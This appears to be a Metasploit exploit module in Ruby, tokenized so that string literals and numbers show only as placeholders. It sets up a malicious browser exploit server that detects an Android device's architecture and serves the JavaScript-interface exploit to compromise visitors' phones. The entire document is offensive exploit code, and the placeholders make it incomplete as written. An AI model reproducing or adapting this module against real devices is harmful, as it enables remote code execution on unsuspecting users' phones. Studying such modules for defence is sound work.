require <str> require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = ExcellentRanking include Msf :: Exploit :: Remote :: BrowserExploitServer include Msf :: Exploit :: Remote :: BrowserAutopwn include Msf :: Exploit :: Android VULN_CHECK_JS = <str> autopwn_info ( <str> = > OperatingSystems :: Match :: ANDROID , <str> = > ARCH_ARMLE , <str> = > true , <str> = > ExcellentRanking , <str> = > VULN_CHECK_JS ) def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > MSF_LICENSE , <str> = > [ <str> , <str> ] , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > [ <str> , <str> ] , <str> = > [ ARCH_DALVIK , ARCH_X86 , ARCH_ARMLE , ARCH_MIPSLE ] , <str> = > { <str> = > <str> } , <str> = > [ [ <str> , { } ] ] , <str> = > <str> , <str> = > <int> , <str> = > { <str> = > <str> , <str> = > OperatingSystems :: Match :: ANDROID , <str> = > VULN_CHECK_JS , <str> = > <str> } ) ) deregister_options ( <str> ) end def on_request_uri ( cli , req ) if req . uri =~ <str> serve_static_js ( cli , req ) else super end end def on_request_exploit ( cli , req , browser ) arch = normalize_arch ( browser [ <str> ] ) print_status <str> arch <str> send_response_html ( cli , html ( arch ) ) end def serve_static_js ( cli , req ) arch = req . qstring [ <str> ] response_opts = { <str> = > <str> } if arch . present? print_status ( <str> normalize_arch arch <str> ) send_response ( cli , add_javascript_interface_exploit_js ( normalize_arch arch ) , response_opts ) else print_status ( <str> ) send_response ( cli , static_arch_detect_js , response_opts ) end end def static_arch_detect_js <str> ARCH_ARMLE <str> ARCH_MIPSLE <str> ARCH_X86 <str> get_uri <str> Rex :: Text :: rand_text_alpha ( <int> ) <str> end def normalize_arch ( arch ) if SUPPORTED_ARCHES . include? ( arch ) then arch else DEFAULT_ARCH end end def html ( arch ) <str> add_javascript_interface_exploit_js ( arch ) <str> end end 
